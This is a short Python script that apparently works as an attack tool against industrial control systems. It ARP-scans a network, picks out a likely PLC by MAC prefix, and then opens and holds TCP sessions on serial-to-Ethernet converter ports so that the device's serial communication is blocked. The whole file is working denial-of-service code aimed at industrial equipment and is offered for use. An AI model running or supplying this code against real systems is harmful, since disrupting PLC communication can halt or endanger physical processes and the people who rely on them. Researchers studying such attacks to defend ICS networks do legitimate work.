import socket
import time
import scapy.all as scapy

def scan_network(ip_range):
    """Scans the network to find the PLC's IP."""
    print("[*] Scanning network to identify PLC...")
    arp_request = scapy.ARP(pdst=ip_range)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    devices = []
    for sent, received in answered:
        devices.append({'ip': received.psrc, 'mac': received.hwsrc})

    return devices

def find_plc(devices):
    """Identifies the likely PLC by checking known MAC/OUI prefixes or specific addresses."""
    for device in devices:
        print(f"[+] Found device: {device['ip']} ({device['mac']})")
        if device['mac'].startswith("00:80:2F") or device['mac'].startswith("00:1B:19"):  # Example OUI for PLCs
            print(f"[!] Identified potential PLC at: {device['ip']}")
            return device['ip']
    return None

def block_serial_com(plc_ip):
    """Holds TCP connections open to block serial communication."""
    ports = [20001, 20002, 20003]  # Typical serial-to-Ethernet converter ports
    sockets = []
    print(f"[*] Blocking serial communication on {plc_ip}...")

    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((plc_ip, port))
            sockets.append(sock)
            print(f"[+] Successfully established connection to {plc_ip}:{port}, holding port open.")
        except socket.error as e:
            print(f"[-] Failed to connect to {plc_ip}:{port} - {e}")

    print("[*] Holding TCP sessions open indefinitely...")
    try:
        while True:
            time.sleep(10)  # Keep connections open
    except KeyboardInterrupt:
        print("\n[*] Releasing connections and exiting...")
        for sock in sockets:
            sock.close()

if __name__ == "__main__":
    network_range = "10.0.0.0/24"  # Adjust based on your environment
    discovered_devices = scan_network(network_range)
    plc_ip = find_plc(discovered_devices)

    if plc_ip:
        block_serial_com(plc_ip)
    else:
        print("[-] No PLC found on the network.")